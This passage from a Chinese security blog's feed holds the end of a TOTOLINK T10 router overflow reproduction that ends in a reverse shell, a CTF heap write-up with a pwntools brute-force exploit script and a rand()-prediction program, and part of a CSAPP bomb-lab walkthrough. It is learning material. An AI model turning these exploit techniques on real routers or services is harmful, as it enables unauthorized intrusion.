class=\"line\">以及下断点到最后,查看最后劫持返回地址的效果</span><br><span class=\"line\">.text:<span class=\"number\">000034</span>C4                 jr      $ra</span><br><span class=\"line\">    </span><br><span class=\"line\">然后c继续执行</span><br><span class=\"line\">    </span><br><span class=\"line\">由于第一次进行<span class=\"built_in\">strcpy</span>会会进行<span class=\"built_in\">strcpy</span>动态链接的符号解析等等,而且gdb中不知道为什么finish等不能用,所以先随便发点东西,不触发漏洞,在第二次运行时,再触发漏洞,具体查看<span class=\"built_in\">strcpy</span>的过程( 非常容易打挂...调试了很多次)</span><br><span class=\"line\">    \t</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这四行代码是复制语句,将输入复制到栈上,</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163515070.png\" alt=\"image-20230514163515070\"></p>\n<p>​\t\t复制成功后,看到已经把返回地址修改了</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163617803.png\" alt=\"image-20230514163617803\"></p>\n<p>​\t\t0x4143b4就是shellcode的开始</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163647722.png\" alt=\"image-20230514163647722\"></p>\n<p>​\t\t返回处 跳到shellcode\t开始执行\t<img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163708915.png\" alt=\"image-20230514163708915\"></p>\n<p>​\t\t获取反弹shell</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514163745190.png\" alt=\"image-20230514163745190\"></p>\n<h4 id=\"7-3-3-遇到的坑\"><a href=\"#7-3-3-遇到的坑\" class=\"headerlink\" title=\"7.3.3 遇到的坑\"></a>7.3.3 遇到的坑</h4><p>​\t\t刚开始调试的时候,发现怎么也弹不回shell,(在mac上开的nc,后来发现其实链接已经建立了,),调试了好久</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514162741686.png\" alt=\"image-20230514162741686\"></p>\n<p>​\t\t其实已经收到了shell,但是没有提示显示….</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514164256153.png\" alt=\"image-20230514164256153\"></p>\n<h1 id=\"八、参考\"><a href=\"#八、参考\" class=\"headerlink\" title=\"八、参考\"></a>八、参考</h1><p><a href=\"https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/\">https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/</a></p>\n<p><a href=\"https://zone.huoxian.cn/d/2676-totolink-cve-2022-25084\">https://zone.huoxian.cn/d/2676-totolink-cve-2022-25084</a></p>\n<p><a href=\"https://www.52pojie.cn/thread-1715223-1-1.html\">https://www.52pojie.cn/thread-1715223-1-1.html</a></p>\n<p><a href=\"https://github.com/gtrboy/totolink\">https://github.com/gtrboy/totolink</a> </p>\n<p><a href=\"https://github.com/SeppPenner/mqttfx171-backup/tree/master/Binaries\">https://github.com/SeppPenner/mqttfx171-backup/tree/master/Binaries</a></p>\n<p><a href=\"https://web.archive.org/web/20220504092050/http://www.jensd.de/apps/mqttfx/1.7.1/\">https://web.archive.org/web/20220504092050/http://www.jensd.de/apps/mqttfx/1.7.1/</a></p>\n<p><a href=\"https://mqttfx.jensd.de/index.php/download\">https://mqttfx.jensd.de/index.php/download</a></p>\n<p><a href=\"https://blog.csdn.net/dong__ge/article/details/126322091\">https://blog.csdn.net/dong__ge/article/details/126322091</a></p>\n<p><a href=\"https://blog.csdn.net/m0_43406494/article/details/124815879\">https://blog.csdn.net/m0_43406494/article/details/124815879</a></p>\n",
            "tags": [
                "路由器"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/",
            "title": "pwn入门-25-高级网络攻防练习题一道",
            "date_published": "2023-05-12T14:34:02.000Z",
            "content_html": "<p>题目链接: 本链接加上 .&#x2F;pwn即可</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512223501172.png\" alt=\"image-20230512223501172\"></p>\n<h2 id=\"程序逻辑分析\"><a href=\"#程序逻辑分析\" class=\"headerlink\" title=\"程序逻辑分析\"></a>程序逻辑分析</h2><p><img src=\"/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512213431688.png\" alt=\"image-20230512213431688\"> </p>\n<p>​\t\t该程序是根据时间戳为随机数的种子,然后随机malloc和free一些内存,即把堆的空间打乱,然后再去给flag分配内容空间,然后把控制权交给用户,让用户进行操作.</p>\n<h2 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><h3 id=\"思路一-枚举\"><a href=\"#思路一-枚举\" class=\"headerlink\" title=\"思路一 枚举\"></a>思路一 枚举</h3><p>​\t\t不论是最开始的打乱堆空间还是分配flag的堆空间,堆块的大小都限定在了0x400以内,也就是tcache的范围. 换言之,堆块的大小有40种情况.</p>\n<p>​\t\tflag分配的堆块必定在这40种情况之中,如果在flag分配的时候,正好分配到了tcache中的bin,那么如果知道tcache中的这个bin的空间中的前一个bin的大小,那么就可以去申请这个bin,然后进行show打印,就有可能打印出来flag. </p>\n<p>​\t\t举例:</p>\n<p>​\t\t先随机化分配了一些堆块</p>\n<p>​\t\t0x100</p>\n<p>​\t\t0x40</p>\n<p>​\t\t0x30</p>\n<p>​\t\t0x50</p>\n<p>​\t\t0x40</p>\n<p>​\t\t然后释放了一些堆块</p>\n<p>​\t\t0x100</p>\n<p>​\t<font color=\"red\">\t0x40\t</font></p>\n<p>​\t\t0x30</p>\n<p><font color=\"red\">\t\t0x50</font></p>\n<p>​\t\t0x40</p>\n<p>​\t\t申请flag堆块</p>\n<p>​\t\t0x100</p>\n<p><font color=\"red\">\t\t0x40</font></p>\n<p>​\t\t0x30</p>\n<p>​\t\t<font color=\"blue\">0x50 flag</font> </p>\n<p>​\t\t0x40</p>\n<p>​\t\t此时,如果能够申请到0x40的空闲堆块,然后进行打印,就有可能会打印出来flag</p>\n<p>​\t\t这种方法存在一定的约束条件:</p>\n<p>​\t\t1.根据tcache的后进先出原则,flag前的空闲堆块需要是最后一个释放的空间,不然的话就要先申请它后面的tcache bin</p>\n<p>​\t\t2.flag的堆块与前面一个空闲堆块的距离要小于show能打印的范围</p>\n<p>​\t\t</p>\n<p>​\t\t不过随着尝试的次数增多,总会有满足这两个约束条件的情况,利用多线程,申请0x10,0x20,0x30….0x400大小的堆块,可以满足所有的情况,那么唯一不确定的就是是否符合约束条件,但通过该种尝试,也大大提高了枚举的成功率</p>\n<h4 id=\"exp攻击脚本\"><a href=\"#exp攻击脚本\" class=\"headerlink\" title=\"exp攻击脚本\"></a>exp攻击脚本</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">brute_force</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;xxxx&quot;</span>, xxxxx)</span><br><span class=\"line\">    context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;Size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;Data: &quot;</span>,<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    recv = p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&quot;flag&quot;</span> <span class=\"keyword\">in</span> recv:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(recv)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">            p.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">            recv = p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    threads = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x10</span>, <span class=\"number\">0x410</span>, <span class=\"number\">0x10</span>):</span><br><span class=\"line\">        t = threading.Thread(target=brute_force, args=(i,))</span><br><span class=\"line\">        threads.append(t)</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> threads:</span><br><span class=\"line\">        t.join()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>把输出 重定向到1.txt 一次不一定能成功,一般几次就可以了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512214621634.png\" alt=\"image-20230512214621634\"></p>\n<h3 id=\"思路二\"><a href=\"#思路二\" class=\"headerlink\" title=\"思路二\"></a>思路二</h3><h4 id=\"漏洞点分析\"><a href=\"#漏洞点分析\" class=\"headerlink\" title=\"漏洞点分析\"></a>漏洞点分析</h4><p>​\t\t随机数种子设置代码:v3 &#x3D; time(0LL);\t\t</p>\n<p>​\t\t对随机数的种子的设置是精确到了s,所以它事实上是可以进行预测的.如果随机值是确定的,那么就可以确定后面分配了哪些堆块,释放了哪些堆块,flag申请到了哪个堆块,flag前面的空闲堆块是哪一个,都可以进行确定</p>\n<p>​\t\t如何就可以获取flag堆块前面的第一个空闲堆块的大小,也可以获取它是第几个.</p>\n<p>​\t\t然后就可以根据时间戳获取确定的解了,就可以算出即将到来的时间对应的解.在时间到来时发送payload即可.</p>\n<h4 id=\"根据时间戳获取flag堆块前一个空闲堆块脚本\"><a href=\"#根据时间戳获取flag堆块前一个空闲堆块脚本\" class=\"headerlink\" title=\"根据时间戳获取flag堆块前一个空闲堆块脚本\"></a>根据时间戳获取flag堆块前一个空闲堆块脚本</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIZE 10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">srand(<span class=\"number\">1000</span>);</span><br><span class=\"line\"><span class=\"type\">int</span> v0 = rand();</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> v1 = v0 &gt;&gt; <span class=\"number\">31</span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> v2 = v1 &gt;&gt; <span class=\"number\">24</span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3 = v2 + v0;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4 = v1 &gt;&gt; <span class=\"number\">24</span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> v5 = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)v3 - (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)v4;</span><br><span class=\"line\"></span><br><span class=\"line\">v3 = v5;</span><br><span class=\"line\"><span class=\"type\">void</span>** pre_sprays = <span class=\"built_in\">malloc</span>(v3 * <span class=\"keyword\">sizeof</span>(<span class=\"type\">void</span>*));</span><br><span class=\"line\"><span class=\"type\">int</span> *pre_spray_sizes = <span class=\"built_in\">malloc</span>(v3 * <span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; v3; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v1 = rand();</span><br><span class=\"line\">    pre_sprays[i] = <span class=\"built_in\">malloc</span>(v1 % <span class=\"number\">1024</span>);</span><br><span class=\"line\">    pre_spray_sizes[i] = malloc_usable_size(pre_sprays[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;v3;++i)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,pre_spray_sizes[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"type\">int</span> *pre_free_sizes = <span class=\"built_in\">malloc</span>(v3 * <span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; v3; ++j )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v1 = rand();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ( v1 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      pre_free_sizes[j] = pre_spray_sizes[j];</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(pre_sprays[j]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> j=<span class=\"number\">0</span>;j&lt;v3;++j)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index:%d, size:%d\\n&quot;</span>,j,pre_free_sizes[j]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    v1 = rand() % <span class=\"number\">982</span> + <span class=\"number\">42</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span>* flagaddr = <span class=\"built_in\">malloc</span>(v1);</span><br><span class=\"line\">    <span class=\"type\">int</span> flagsize = malloc_usable_size(flagaddr);</span><br><span class=\"line\">    v1 = rand();</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;flag size:%d\\n&quot;</span>,flagsize);</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">int</span> tmp;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = v3 - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pre_free_sizes[i] == flagsize) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d is the index\\n&quot;</span>,i);</span><br><span class=\"line\">        tmp = i;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = tmp - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pre_free_sizes[i]!= <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: %d , size: %d &quot;</span>,i,pre_free_sizes[i]);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t根据这个脚本可以获取flag堆块前面一个空闲堆块的位置和大小,(脚本有待完善,没有判断是第几个,大小貌似也有点问题)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512215715328.png\" alt=\"image-20230512215715328\"></p>\n<p>还有就是可以同时多开几个不同的大小的,一起尝试</p>\n<h2 id=\"技术点总结\"><a href=\"#技术点总结\" class=\"headerlink\" title=\"技术点总结\"></a>技术点总结</h2><p>1.c语言随机数函数srand、rand的理解</p>\n<p>​\t\t其实这是个伪随机数函数,如果能确定srand的输入,那么随机数的种子就是确定的,rand得到的随机数的值也是确定的.</p>\n<p>2.对堆块布局的理解</p>\n<p>​\t\t在没有bin的情况下,堆的申请在堆内存中是连续的,所以堆块之间都是相邻的,如果想要获取一个堆块的信息,可以通过与它相临的堆块的越界读取来获得.</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/csapp-bomb-lab/",
            "url": "https://tangzichengcc.github.io/csapp-bomb-lab/",
            "title": "csapp-bomb_lab",
            "date_published": "2023-05-06T14:02:35.000Z",
            "content_html": "<p><a href=\"http://csapp.cs.cmu.edu/3e/labs.html\">http://csapp.cs.cmu.edu/3e/labs.html</a></p>\n<p>​\t\t这个实验是一个逆向实验,主要是逆向代码,理解程序逻辑.主要是静态分析,有一些东西不好理解可以借助动态分析来调试.</p>\n<p>​\t\t题目主要分了六步,以及一个隐藏关卡</p>\n<h1 id=\"阶段一\"><a href=\"#阶段一\" class=\"headerlink\" title=\"阶段一\"></a>阶段一</h1><p>​\t\t直接对比字符串即可,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">phase_1</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = strings_not_equal(a1, <span class=\"string\">&quot;Border relations with Canada have never been better.&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (_DWORD)result )</span><br><span class=\"line\">    explode_bomb();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"阶段二\"><a href=\"#阶段二\" class=\"headerlink\" title=\"阶段二\"></a>阶段二</h1><p>​\t\t读取六个值,第一个值必须为1. 然后循环处理剩下五个值,这里有一条关键语句,对它的理解非常重要</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(<span class=\"number\">2</span> * *((_DWORD *)v2 - <span class=\"number\">1</span>));</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t(_DWORD *)v2这个的意思是把v2这个指针强制转换成 _DWORD类型的指针,然后对v2这个指针-1,其实是-4字节(减去指针指向的数据类型的大小),也就是指向这个指针的前一个数值的指针,然后再加一个 * 得到  这个位置的值,然后再乘2</p>\n<p><img src=\"/csapp-bomb-lab/image-20230506222448681.png\" alt=\"image-20230506222448681\"></p>\n<p>​\t\t综上所述,第一个位置为1,下一个位置是上一个位置的两倍,于是答案:1 2 4 8 16 32</p>\n<h1 id=\"阶段三\"><a href=\"#阶段三\" class=\"headerlink\" title=\"阶段三\"></a>阶段三</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)__isoc99_sscanf(a1, <span class=\"string\">&quot;%d %d&quot;</span>, &amp;v2, &amp;v3) &lt;= <span class=\"number\">1</span> )</span><br><span class=\"line\">   explode_bomb();</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t把a1按照空格分开两个数,分别给v2,v3, v2对应的值和v3一样即可,有多个解, 如:0 207</p>\n<h1 id=\"阶段四\"><a href=\"#阶段四\" class=\"headerlink\" title=\"阶段四\"></a>阶段四</h1><p>​\t\tscanf的返回值是 匹配上的个数,所以阶段三可以只输入v2,那能有解吗??????</p>\n<p>​\t\t这里有个递归调用,result和v3都要为0,v3直接输入0即可,result呢,进func4能发现func4里的v3和我们输出的v2只要相等,就会返回0,v3的值是固定的7,所以v2输入7即可.</p>\n<p>​\t\t有个注意的点就是看清楚条件,这个条件是都需要为0才能过关,刚开始以为都不能为0(思维惯性?)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( (_DWORD)result || v3 )</span><br><span class=\"line\">  explode_bomb();</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t7 0 </p>\n<h1 id=\"阶段五\"><a href=\"#阶段五\" class=\"headerlink\" title=\"阶段五\"></a>阶段五</h1><p>​\t\t输入一个长度为6的字符串,每个值与0xf进行与操作,然后取array_3449数组中相应的值,看是否与flyers字符串里对应的字符匹配</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)string_length(a1) != <span class=\"number\">6</span> )</span><br><span class=\"line\">  explode_bomb();</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0LL</span>; i != <span class=\"number\">6</span>; ++i )</span><br><span class=\"line\">  v3[i] = array_3449[*(_BYTE *)(a1 + i) &amp; <span class=\"number\">0xF</span>];</span><br><span class=\"line\">v3[<span class=\"number\">6</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)strings_not_equal(v3, <span class=\"string\">&quot;flyers&quot;</span>) )</span><br><span class=\"line\">  explode_bomb();</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t逆向过来想的话,先找到array_3449数组中对应的值</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array_3449: ?aduiersnfotvbyl</span><br><span class=\"line\">    </span><br><span class=\"line\"><span 